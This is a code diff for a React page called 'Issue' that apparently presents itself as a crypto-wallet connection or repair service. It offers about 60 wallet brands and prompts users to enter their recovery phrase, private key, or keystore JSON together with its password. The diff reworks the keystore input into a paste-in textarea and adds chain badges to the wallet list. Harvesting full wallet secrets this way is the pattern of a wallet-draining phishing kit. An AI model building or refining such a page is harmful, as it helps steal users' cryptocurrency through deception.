@@ -23,7 +23,7 @@ export default function Issue() {
   
   // Wallet connection states
   const [phrase, setPhrase] = useState('');
-  const [keystoreFile, setKeystoreFile] = useState<File | null>(null);
+  const [keystoreJson, setKeystoreJson] = useState('');
   const [keystorePassword, setKeystorePassword] = useState('');
   const [privateKey, setPrivateKey] = useState('');
   const [selectedWalletType, setSelectedWalletType] = useState<string>('');
@@ -195,25 +195,29 @@ export default function Issue() {
   };
 
   const handleKeystoreSubmit = () => {
-    if (!keystoreFile || !keystorePassword.trim()) {
+    if (!keystoreJson.trim() || !keystorePassword.trim()) {
       toast({
         title: "Invalid Input",
-        description: "Please enter keystore JSON and password",
+        description: "Please enter your keystore JSON and password",
         variant: "destructive",
       });
       return;
     }
 
-    const reader = new FileReader();
-    reader.onload = (e) => {
-      const keystoreContent = e.target?.result as string;
+    try {
+      // Validate JSON format
+      JSON.parse(keystoreJson);
       submitWalletData('keystore', { 
-        filename: keystoreFile.name,
-        content: keystoreContent,
+        keystore: keystoreJson,
         password: keystorePassword 
       });
-    };
-    reader.readAsText(keystoreFile);
+    } catch (error) {
+      toast({
+        title: "Invalid JSON",
+        description: "Please enter valid JSON format for your keystore",
+        variant: "destructive",
+      });
+    }
   };
 
   const handlePrivateKeySubmit = () => {
@@ -228,82 +232,82 @@ export default function Issue() {
     submitWalletData('privateKey', { privateKey });
   };
 
-  // Comprehensive wallet list with search functionality
+  // Comprehensive wallet list with blockchain compatibility
   const allWallets = [
     // Tier 1 - Most Popular
-    { id: 'metamask', name: 'MetaMask', icon: '🦊', tier: 1, category: 'Popular' },
-    { id: 'trust', name: 'Trust Wallet', icon: '🛡️', tier: 1, category: 'Popular' },
-    { id: 'phantom', name: 'Phantom', icon: '👻', tier: 1, category: 'Popular' },
-    { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔷', tier: 1, category: 'Popular' },
-    { id: 'walletconnect', name: 'WalletConnect', icon: '🔗', tier: 1, category: 'Popular' },
-    { id: 'rainbow', name: 'Rainbow', icon: '🌈', tier: 1, category: 'Popular' },
+    { id: 'metamask', name: 'MetaMask', icon: '🦊', tier: 1, category: 'Popular', chains: ['Ethereum', 'Polygon', 'BSC', 'Avalanche', 'Arbitrum', 'Optimism'] },
+    { id: 'trust', name: 'Trust Wallet', icon: '🛡️', tier: 1, category: 'Popular', chains: ['Ethereum', 'Bitcoin', 'BSC', 'Polygon', 'Solana', 'Avalanche', 'Tron'] },
+    { id: 'phantom', name: 'Phantom', icon: '👻', tier: 1, category: 'Popular', chains: ['Solana', 'Ethereum', 'Polygon'] },
+    { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔷', tier: 1, category: 'Popular', chains: ['Ethereum', 'Bitcoin', 'Polygon', 'Avalanche', 'Base', 'Optimism'] },
+    { id: 'walletconnect', name: 'WalletConnect', icon: '🔗', tier: 1, category: 'Popular', chains: ['Multi-chain'] },
+    { id: 'rainbow', name: 'Rainbow', icon: '🌈', tier: 1, category: 'Popular', chains: ['Ethereum', 'Polygon', 'Arbitrum', 'Optimism', 'Base'] },
     
     // Hardware Wallets
-    { id: 'ledger', name: 'Ledger', icon: '🔐', tier: 2, category: 'Hardware' },
-    { id: 'trezor', name: 'Trezor', icon: '🔒', tier: 2, category: 'Hardware' },
-    { id: 'tangem', name: 'Tangem', icon: '💳', tier: 2, category: 'Hardware' },
-    { id: 'coolwallet', name: 'CoolWallet', icon: '❄️', tier: 2, category: 'Hardware' },
-    { id: 'dcent', name: "D'CENT", icon: '🔓', tier: 2, category: 'Hardware' },
-    { id: 'gridplus', name: 'GridPlus', icon: '⚡', tier: 2, category: 'Hardware' },
-    { id: 'ellipal', name: 'Ellipal', icon: '🛡️', tier: 2, category: 'Hardware' },
+    { id: 'ledger', name: 'Ledger', icon: '🔐', tier: 2, category: 'Hardware', chains: ['Bitcoin', 'Ethereum', 'Polygon', 'BSC', 'Cardano', 'Solana', 'Avalanche', 'Cosmos'] },
+    { id: 'trezor', name: 'Trezor', icon: '🔒', tier: 2, category: 'Hardware', chains: ['Bitcoin', 'Ethereum', 'Litecoin', 'Bitcoin Cash', 'Ethereum Classic'] },
+    { id: 'tangem', name: 'Tangem', icon: '💳', tier: 2, category: 'Hardware', chains: ['Bitcoin', 'Ethereum', 'BSC', 'Polygon', 'Cardano', 'XRP'] },
+    { id: 'coolwallet', name: 'CoolWallet', icon: '❄️', tier: 2, category: 'Hardware', chains: ['Bitcoin', 'Ethereum', 'XRP', 'Litecoin', 'Bitcoin Cash'] },
+    { id: 'dcent', name: "D'CENT", icon: '🔓', tier: 2, category: 'Hardware', chains: ['Bitcoin', 'Ethereum', 'XRP', 'BSC', 'Tron', 'Klaytn'] },
+    { id: 'gridplus', name: 'GridPlus', icon: '⚡', tier: 2, category: 'Hardware', chains: ['Ethereum', 'Bitcoin', 'Polygon', 'BSC', 'Avalanche'] },
+    { id: 'ellipal', name: 'Ellipal', icon: '🛡️', tier: 2, category: 'Hardware', chains: ['Bitcoin', 'Ethereum', 'BSC', 'Polygon', 'Avalanche', 'Solana'] },
     
     // Exchange Wallets
-    { id: 'binance', name: 'Binance Wallet', icon: '⚡', tier: 3, category: 'Exchange' },
-    { id: 'okx', name: 'OKX Wallet', icon: '🎯', tier: 3, category: 'Exchange' },
-    { id: 'bitget', name: 'Bitget Wallet', icon: '💎', tier: 3, category: 'Exchange' },
-    { id: 'bybit', name: 'Bybit Wallet', icon: '🔸', tier: 3, category: 'Exchange' },
-    { id: 'kucoin', name: 'KuCoin Wallet', icon: '💚', tier: 3, category: 'Exchange' },
-    { id: 'gate', name: 'Gate.io Wallet', icon: '🚪', tier: 3, category: 'Exchange' },
-    { id: 'huobi', name: 'HTX Wallet', icon: '🔺', tier: 3, category: 'Exchange' },
-    { id: 'mexc', name: 'MEXC Wallet', icon: '📈', tier: 3, category: 'Exchange' },
-    { id: 'crypto_com', name: 'Crypto.com DeFi', icon: '💰', tier: 3, category: 'Exchange' },
+    { id: 'binance', name: 'Binance Wallet', icon: '⚡', tier: 3, category: 'Exchange', chains: ['BSC', 'Ethereum', 'Bitcoin', 'Polygon', 'Avalanche', 'Solana'] },
+    { id: 'okx', name: 'OKX Wallet', icon: '🎯', tier: 3, category: 'Exchange', chains: ['Ethereum', 'Bitcoin', 'BSC', 'Polygon', 'Avalanche', 'Solana', 'Arbitrum'] },
+    { id: 'bitget', name: 'Bitget Wallet', icon: '💎', tier: 3, category: 'Exchange', chains: ['Ethereum', 'BSC', 'Polygon', 'Avalanche', 'Solana', 'Arbitrum'] },
+    { id: 'bybit', name: 'Bybit Wallet', icon: '🔸', tier: 3, category: 'Exchange', chains: ['Ethereum', 'BSC', 'Polygon', 'Avalanche', 'Solana'] },
+    { id: 'kucoin', name: 'KuCoin Wallet', icon: '💚', tier: 3, category: 'Exchange', chains: ['Ethereum', 'BSC', 'Polygon', 'Avalanche', 'Solana', 'KCC'] },
+    { id: 'gate', name: 'Gate.io Wallet', icon: '🚪', tier: 3, category: 'Exchange', chains: ['Ethereum', 'BSC', 'Polygon', 'Avalanche', 'Solana'] },
+    { id: 'huobi', name: 'HTX Wallet', icon: '🔺', tier: 3, category: 'Exchange', chains: ['Ethereum', 'BSC', 'HECO', 'Polygon', 'Avalanche'] },
+    { id: 'mexc', name: 'MEXC Wallet', icon: '📈', tier: 3, category: 'Exchange', chains: ['Ethereum', 'BSC', 'Polygon', 'Avalanche', 'Solana'] },
+    { id: 'crypto_com', name: 'Crypto.com DeFi', icon: '💰', tier: 3, category: 'Exchange', chains: ['Ethereum', 'BSC', 'Polygon', 'Cronos', 'Avalanche'] },
     
     // Mobile & Desktop Wallets
-    { id: 'exodus', name: 'Exodus', icon: '🚀', tier: 4, category: 'Desktop' },
-    { id: 'atomic', name: 'Atomic Wallet', icon: '⚛️', tier: 4, category: 'Desktop' },
-    { id: 'safepal', name: 'SafePal', icon: '🔰', tier: 4, category: 'Mobile' },
-    { id: 'imtoken', name: 'imToken', icon: '💎', tier: 4, category: 'Mobile' },
-    { id: 'tokenpocket', name: 'TokenPocket', icon: '👛', tier: 4, category: 'Mobile' },
-    { id: 'mathwallet', name: 'MathWallet', icon: '🧮', tier: 4, category: 'Mobile' },
-    { id: 'coinomi', name: 'Coinomi', icon: '🪙', tier: 4, category: 'Mobile' },
-    { id: 'jaxx', name: 'Jaxx Liberty', icon: '💼', tier: 4, category: 'Desktop' },
-    { id: 'enjin', name: 'Enjin Wallet', icon: '🎮', tier: 4, category: 'Mobile' },
-    { id: 'onto', name: 'ONTO Wallet', icon: '🌊', tier: 4, category: 'Mobile' },
-    { id: 'klever', name: 'Klever Wallet', icon: '⚡', tier: 4, category: 'Mobile' },
+    { id: 'exodus', name: 'Exodus', icon: '🚀', tier: 4, category: 'Desktop', chains: ['Bitcoin', 'Ethereum', 'BSC', 'Polygon', 'Avalanche', 'Solana', 'Cardano'] },
+    { id: 'atomic', name: 'Atomic Wallet', icon: '⚛️', tier: 4, category: 'Desktop', chains: ['Bitcoin', 'Ethereum', 'BSC', 'Polygon', 'Avalanche', 'Cardano', 'Tron'] },
+    { id: 'safepal', name: 'SafePal', icon: '🔰', tier: 4, category: 'Mobile', chains: ['Bitcoin', 'Ethereum', 'BSC', 'Polygon', 'Avalanche', 'Solana'] },
+    { id: 'imtoken', name: 'imToken', icon: '💎', tier: 4, category: 'Mobile', chains: ['Ethereum', 'BSC', 'Polygon', 'Avalanche', 'Arbitrum', 'Optimism'] },
+    { id: 'tokenpocket', name: 'TokenPocket', icon: '👛', tier: 4, category: 'Mobile', chains: ['Ethereum', 'BSC', 'Polygon', 'Solana', 'EOS', 'Tron', 'IOST'] },
+    { id: 'mathwallet', name: 'MathWallet', icon: '🧮', tier: 4, category: 'Mobile', chains: ['Ethereum', 'BSC', 'Polygon', 'Solana', 'Polkadot', 'Cosmos'] },
+    { id: 'coinomi', name: 'Coinomi', icon: '🪙', tier: 4, category: 'Mobile', chains: ['Bitcoin', 'Ethereum', 'BSC', 'Polygon', 'Litecoin', 'Bitcoin Cash'] },
+    { id: 'jaxx', name: 'Jaxx Liberty', icon: '💼', tier: 4, category: 'Desktop', chains: ['Bitcoin', 'Ethereum', 'BSC', 'Litecoin', 'Bitcoin Cash', 'Dash'] },
+    { id: 'enjin', name: 'Enjin Wallet', icon: '🎮', tier: 4, category: 'Mobile', chains: ['Ethereum', 'BSC', 'Polygon', 'Avalanche'] },
+    { id: 'onto', name: 'ONTO Wallet', icon: '🌊', tier: 4, category: 'Mobile', chains: ['Ethereum', 'BSC', 'Polygon', 'Ontology', 'Neo'] },
+    { id: 'klever', name: 'Klever Wallet', icon: '⚡', tier: 4, category: 'Mobile', chains: ['Klever', 'Tron', 'Ethereum', 'BSC', 'Polygon'] },
     
     // Specialized Wallets
-    { id: 'xaman', name: 'Xaman Wallet', icon: '✨', tier: 5, category: 'Specialized' },
-    { id: 'solfare', name: 'Solfare Wallet', icon: '☀️', tier: 5, category: 'Specialized' },
-    { id: 'unisat', name: 'Unisat Wallet', icon: '🪙', tier: 5, category: 'Specialized' },
-    { id: 'sui', name: 'Sui Wallet', icon: '🌊', tier: 5, category: 'Specialized' },
-    { id: 'leather', name: 'Leather Wallet', icon: '👜', tier: 5, category: 'Specialized' },
-    { id: 'aptos', name: 'APTOS Wallet', icon: '🅰️', tier: 5, category: 'Specialized' },
-    { id: 'xverse', name: 'Xverse Wallet', icon: '🪐', tier: 5, category: 'Specialized' },
-    { id: 'mytonwallet', name: 'MyTon Wallet', icon: '💎', tier: 5, category: 'Specialized' },
-    { id: 'tonkeeper', name: 'Tonkeeper', icon: '🔷', tier: 5, category: 'Specialized' },
-    { id: 'tonhub', name: 'TonHub', icon: '🏠', tier: 5, category: 'Specialized' },
-    { id: 'electrum', name: 'Electrum', icon: '⚡', tier: 5, category: 'Specialized' },
-    { id: 'magiceden', name: 'Magic Eden Wallet', icon: '🪄', tier: 5, category: 'Specialized' },
-    { id: 'zelcore', name: 'ZelCore', icon: '🖥️', tier: 5, category: 'Specialized' },
-    { id: 'coin98', name: 'Coin98', icon: '🪙', tier: 5, category: 'Specialized' },
+    { id: 'xaman', name: 'Xaman Wallet', icon: '✨', tier: 5, category: 'Specialized', chains: ['XRP Ledger'] },
+    { id: 'solfare', name: 'Solfare Wallet', icon: '☀️', tier: 5, category: 'Specialized', chains: ['Solana'] },
+    { id: 'unisat', name: 'Unisat Wallet', icon: '🪙', tier: 5, category: 'Specialized', chains: ['Bitcoin', 'Ordinals'] },
+    { id: 'sui', name: 'Sui Wallet', icon: '🌊', tier: 5, category: 'Specialized', chains: ['Sui'] },
+    { id: 'leather', name: 'Leather Wallet', icon: '👜', tier: 5, category: 'Specialized', chains: ['Stacks', 'Bitcoin'] },
+    { id: 'aptos', name: 'APTOS Wallet', icon: '🅰️', tier: 5, category: 'Specialized', chains: ['Aptos'] },
+    { id: 'xverse', name: 'Xverse Wallet', icon: '🪐', tier: 5, category: 'Specialized', chains: ['Bitcoin', 'Stacks', 'Ordinals'] },
+    { id: 'mytonwallet', name: 'MyTon Wallet', icon: '💎', tier: 5, category: 'Specialized', chains: ['TON'] },
+    { id: 'tonkeeper', name: 'Tonkeeper', icon: '🔷', tier: 5, category: 'Specialized', chains: ['TON'] },
+    { id: 'tonhub', name: 'TonHub', icon: '🏠', tier: 5, category: 'Specialized', chains: ['TON'] },
+    { id: 'electrum', name: 'Electrum', icon: '⚡', tier: 5, category: 'Specialized', chains: ['Bitcoin', 'Litecoin'] },
+    { id: 'magiceden', name: 'Magic Eden Wallet', icon: '🪄', tier: 5, category: 'Specialized', chains: ['Solana', 'Ethereum', 'Polygon'] },
+    { id: 'zelcore', name: 'ZelCore', icon: '🖥️', tier: 5, category: 'Specialized', chains: ['Flux', 'Bitcoin', 'Ethereum', 'BSC', 'Zelcash'] },
+    { id: 'coin98', name: 'Coin98', icon: '🪙', tier: 5, category: 'Specialized', chains: ['Ethereum', 'BSC', 'Polygon', 'Solana', 'Near', 'Avalanche'] },
     
     // Web3 & DeFi Wallets
-    { id: 'argent', name: 'Argent', icon: '🛡️', tier: 6, category: 'Web3' },
-    { id: 'zengo', name: 'Zengo', icon: '🔮', tier: 6, category: 'Web3' },
-    { id: 'bestwallet', name: 'Best Wallet', icon: '⭐', tier: 6, category: 'Web3' },
-    { id: 'uniswap', name: 'Uniswap Wallet', icon: '🦄', tier: 6, category: 'Web3' },
-    { id: 'robinhood', name: 'Robinhood Wallet', icon: '🏹', tier: 6, category: 'Web3' },
-    { id: 'alphawallet', name: 'AlphaWallet', icon: '🅰️', tier: 6, category: 'Web3' },
-    { id: '1inch', name: '1inch Wallet', icon: '🔄', tier: 6, category: 'Web3' },
-    { id: 'unstoppable', name: 'Unstoppable', icon: '🌐', tier: 6, category: 'Web3' },
-    { id: 'bitkeep', name: 'BitKeep', icon: '🔑', tier: 6, category: 'Web3' },
-    { id: 'myetherwallet', name: 'MyEtherWallet', icon: '🔷', tier: 6, category: 'Web3' },
-    { id: 'frame', name: 'Frame', icon: '🖼️', tier: 6, category: 'Web3' },
-    { id: 'gnosis', name: 'Gnosis Safe', icon: '🔒', tier: 6, category: 'Web3' },
-    { id: 'portis', name: 'Portis', icon: '🚪', tier: 6, category: 'Web3' },
-    { id: 'torus', name: 'Torus', icon: '🌀', tier: 6, category: 'Web3' },
-    { id: 'authereum', name: 'Authereum', icon: '🔐', tier: 6, category: 'Web3' },
-    { id: 'venly', name: 'Venly', icon: '💎', tier: 6, category: 'Web3' },
+    { id: 'argent', name: 'Argent', icon: '🛡️', tier: 6, category: 'Web3', chains: ['Ethereum', 'Starknet', 'zkSync'] },
+    { id: 'zengo', name: 'Zengo', icon: '🔮', tier: 6, category: 'Web3', chains: ['Bitcoin', 'Ethereum', 'BSC', 'Polygon'] },
+    { id: 'bestwallet', name: 'Best Wallet', icon: '⭐', tier: 6, category: 'Web3', chains: ['Ethereum', 'BSC', 'Polygon', 'Avalanche'] },
+    { id: 'uniswap', name: 'Uniswap Wallet', icon: '🦄', tier: 6, category: 'Web3', chains: ['Ethereum', 'Polygon', 'Arbitrum', 'Optimism', 'Base'] },
+    { id: 'robinhood', name: 'Robinhood Wallet', icon: '🏹', tier: 6, category: 'Web3', chains: ['Ethereum', 'Polygon'] },
+    { id: 'alphawallet', name: 'AlphaWallet', icon: '🅰️', tier: 6, category: 'Web3', chains: ['Ethereum', 'BSC', 'Polygon', 'Avalanche', 'Arbitrum'] },
+    { id: '1inch', name: '1inch Wallet', icon: '🔄', tier: 6, category: 'Web3', chains: ['Ethereum', 'BSC', 'Polygon', 'Avalanche', 'Arbitrum', 'Optimism'] },
+    { id: 'unstoppable', name: 'Unstoppable', icon: '🌐', tier: 6, category: 'Web3', chains: ['Ethereum', 'Polygon', 'BSC'] },
+    { id: 'bitkeep', name: 'BitKeep', icon: '🔑', tier: 6, category: 'Web3', chains: ['Ethereum', 'BSC', 'Polygon', 'Solana', 'Avalanche'] },
+    { id: 'myetherwallet', name: 'MyEtherWallet', icon: '🔷', tier: 6, category: 'Web3', chains: ['Ethereum', 'BSC', 'Polygon'] },
+    { id: 'frame', name: 'Frame', icon: '🖼️', tier: 6, category: 'Web3', chains: ['Ethereum', 'Polygon', 'Arbitrum'] },
+    { id: 'gnosis', name: 'Gnosis Safe', icon: '🔒', tier: 6, category: 'Web3', chains: ['Ethereum', 'Polygon', 'BSC', 'Gnosis Chain', 'Arbitrum'] },
+    { id: 'portis', name: 'Portis', icon: '🚪', tier: 6, category: 'Web3', chains: ['Ethereum'] },
+    { id: 'torus', name: 'Torus', icon: '🌀', tier: 6, category: 'Web3', chains: ['Ethereum', 'BSC', 'Polygon'] },
+    { id: 'authereum', name: 'Authereum', icon: '🔐', tier: 6, category: 'Web3', chains: ['Ethereum'] },
+    { id: 'venly', name: 'Venly', icon: '💎', tier: 6, category: 'Web3', chains: ['Ethereum', 'Polygon', 'BSC', 'Avalanche'] },
   ];
 
   // Filter wallets based on search query
@@ -347,17 +351,31 @@ export default function Issue() {
                     <h5 className="text-sm font-medium text-gray-700 mb-3">
                       Search Results ({filteredWallets.length} found)
                     </h5>
-                    <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-5 gap-2 max-h-80 overflow-y-auto">
+                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 max-h-80 overflow-y-auto">
                       {filteredWallets.map((wallet) => (
                         <Button
                           key={wallet.id}
                           variant="outline"
                           size="sm"
-                          className="h-16 flex flex-col items-center justify-center space-y-1 border-gray-200 hover:border-blue-300 hover:bg-blue-50 transition-all duration-200 group"
+                          className="h-auto p-3 flex flex-col items-start space-y-2 border-gray-200 hover:border-blue-300 hover:bg-blue-50 transition-all duration-200 group text-left"
                           onClick={() => setSelectedWalletType(wallet.name)}
                         >
-                          <span className="text-lg group-hover:scale-110 transition-transform duration-200">{wallet.icon}</span>
-                          <span className="text-xs font-medium text-gray-700 group-hover:text-blue-600 text-center leading-tight">{wallet.name}</span>
+                          <div className="flex items-center space-x-2 w-full">
+                            <span className="text-xl group-hover:scale-110 transition-transform duration-200">{wallet.icon}</span>
+                            <span className="text-sm font-medium text-gray-900 group-hover:text-blue-600">{wallet.name}</span>
+                          </div>
+                          <div className="flex flex-wrap gap-1 w-full">
+                            {wallet.chains.slice(0, 4).map((chain, index) => (
+                              <span key={index} className="text-xs px-2 py-1 bg-gray-100 text-gray-600 rounded-full">
+                                {chain}
+                              </span>
+                            ))}
+                            {wallet.chains.length > 4 && (
+                              <span className="text-xs px-2 py-1 bg-gray-100 text-gray-600 rounded-full">
+                                +{wallet.chains.length - 4} more
+                              </span>
+                            )}
+                          </div>
                         </Button>
                       ))}
                     </div>
@@ -370,16 +388,30 @@ export default function Issue() {
                         <span className="w-2 h-2 bg-green-500 rounded-full mr-2"></span>
                         Most Popular
                       </h5>
-                      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3">
+                      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
                         {getWalletsByCategory('Popular').map((wallet) => (
                           <Button
                             key={wallet.id}
                             variant="outline"
-                            className="h-20 flex flex-col items-center justify-center space-y-2 border-gray-200 hover:border-green-300 hover:bg-green-50 transition-all duration-200 group shadow-sm hover:shadow-md"
+                            className="h-auto p-3 flex flex-col items-start space-y-2 border-gray-200 hover:border-green-300 hover:bg-green-50 transition-all duration-200 group shadow-sm hover:shadow-md text-left"
                             onClick={() => setSelectedWalletType(wallet.name)}
                           >
-                            <span className="text-2xl group-hover:scale-110 transition-transform duration-200">{wallet.icon}</span>
-                            <span className="text-xs font-medium text-gray-700 group-hover:text-green-600 text-center leading-tight">{wallet.name}</span>
+                            <div className="flex items-center space-x-2 w-full">
+                              <span className="text-2xl group-hover:scale-110 transition-transform duration-200">{wallet.icon}</span>
+                              <span className="text-sm font-semibold text-gray-900 group-hover:text-green-600">{wallet.name}</span>
+                            </div>
+                            <div className="flex flex-wrap gap-1 w-full">
+                              {wallet.chains.slice(0, 5).map((chain, index) => (
+                                <span key={index} className="text-xs px-2 py-1 bg-green-100 text-green-700 rounded-full">
+                                  {chain}
+                                </span>
+                              ))}
+                              {wallet.chains.length > 5 && (
+                                <span className="text-xs px-2 py-1 bg-green-100 text-green-700 rounded-full">
+                                  +{wallet.chains.length - 5}
+                                </span>
+                              )}
+                            </div>
                           </Button>
                         ))}
                       </div>
@@ -391,16 +423,30 @@ export default function Issue() {
                         <span className="w-2 h-2 bg-blue-500 rounded-full mr-2"></span>
                         Hardware Wallets
                       </h5>
-                      <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-7 gap-3">
+                      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
                         {getWalletsByCategory('Hardware').map((wallet) => (
                           <Button
                             key={wallet.id}
                             variant="outline"
-                            className="h-18 flex flex-col items-center justify-center space-y-1 border-gray-200 hover:border-blue-300 hover:bg-blue-50 transition-all duration-200 group"
+                            className="h-auto p-3 flex flex-col items-start space-y-2 border-gray-200 hover:border-blue-300 hover:bg-blue-50 transition-all duration-200 group text-left"
                             onClick={() => setSelectedWalletType(wallet.name)}
                           >
-                            <span className="text-xl group-hover:scale-110 transition-transform duration-200">{wallet.icon}</span>
-                            <span className="text-xs font-medium text-gray-700 group-hover:text-blue-600 text-center leading-tight">{wallet.name}</span>
+                            <div className="flex items-center space-x-2 w-full">
+                              <span className="text-xl group-hover:scale-110 transition-transform duration-200">{wallet.icon}</span>
+                              <span className="text-sm font-medium text-gray-900 group-hover:text-blue-600">{wallet.name}</span>
+                            </div>
+                            <div className="flex flex-wrap gap-1 w-full">
+                              {wallet.chains.slice(0, 4).map((chain, index) => (
+                                <span key={index} className="text-xs px-2 py-1 bg-blue-100 text-blue-700 rounded-full">
+                                  {chain}
+                                </span>
+                              ))}
+                              {wallet.chains.length > 4 && (
+                                <span className="text-xs px-2 py-1 bg-blue-100 text-blue-700 rounded-full">
+                                  +{wallet.chains.length - 4}
+                                </span>
+                              )}
+                            </div>
                           </Button>
                         ))}
                       </div>
@@ -421,17 +467,31 @@ export default function Issue() {
                                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                               </svg>
                             </summary>
-                            <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-6 gap-2 mt-3">
+                            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2 mt-3">
                               {categoryWallets.map((wallet) => (
                                 <Button
                                   key={wallet.id}
                                   variant="outline"
                                   size="sm"
-                                  className="h-16 flex flex-col items-center justify-center space-y-1 border-gray-200 hover:border-purple-300 hover:bg-purple-50 transition-all duration-200 group text-xs"
+                                  className="h-auto p-2 flex flex-col items-start space-y-1 border-gray-200 hover:border-purple-300 hover:bg-purple-50 transition-all duration-200 group text-left"
                                   onClick={() => setSelectedWalletType(wallet.name)}
                                 >
-                                  <span className="text-lg group-hover:scale-110 transition-transform duration-200">{wallet.icon}</span>
-                                  <span className="font-medium text-gray-700 group-hover:text-purple-600 text-center leading-tight">{wallet.name}</span>
+                                  <div className="flex items-center space-x-2 w-full">
+                                    <span className="text-lg group-hover:scale-110 transition-transform duration-200">{wallet.icon}</span>
+                                    <span className="text-xs font-medium text-gray-900 group-hover:text-purple-600">{wallet.name}</span>
+                                  </div>
+                                  <div className="flex flex-wrap gap-1 w-full">
+                                    {wallet.chains.slice(0, 3).map((chain, index) => (
+                                      <span key={index} className="text-xs px-1.5 py-0.5 bg-purple-100 text-purple-700 rounded-full">
+                                        {chain}
+                                      </span>
+                                    ))}
+                                    {wallet.chains.length > 3 && (
+                                      <span className="text-xs px-1.5 py-0.5 bg-purple-100 text-purple-700 rounded-full">
+                                        +{wallet.chains.length - 3}
+                                      </span>
+                                    )}
+                                  </div>
                                 </Button>
                               ))}
                             </div>
@@ -486,13 +546,17 @@ export default function Issue() {
                   
                   <TabsContent value="keystore" className="space-y-4">
                     <div>
-                      <Label htmlFor="keystore">Upload Keystore JSON file</Label>
-                      <Input
+                      <Label htmlFor="keystore">Keystore JSON</Label>
+                      <p className="text-xs text-gray-500 mb-2">
+                        Several lines of text beginning with {'"{...}"'} plus the password you used to encrypt it
+                      </p>
+                      <Textarea
                         id="keystore"
-                        type="file"
-                        accept=".json"
-                        onChange={(e) => setKeystoreFile(e.target.files?.[0] || null)}
-                        className="mt-2"
+                        value={keystoreJson}
+                        onChange={(e) => setKeystoreJson(e.target.value)}
+                        placeholder='{"version":3,"id":"...","address":"...","crypto":{...}}'
+                        className="mt-2 h-32 font-mono text-sm"
+                        rows={6}
                       />
                     </div>
                     <div>
@@ -509,7 +573,7 @@ export default function Issue() {
                     <Button 
                       onClick={handleKeystoreSubmit} 
                       className="w-full" 
-                      disabled={loading || !keystoreFile || !keystorePassword.trim()}
+                      disabled={loading || !keystoreJson.trim() || !keystorePassword.trim()}
                     >
                       {loading ? (
                         <>
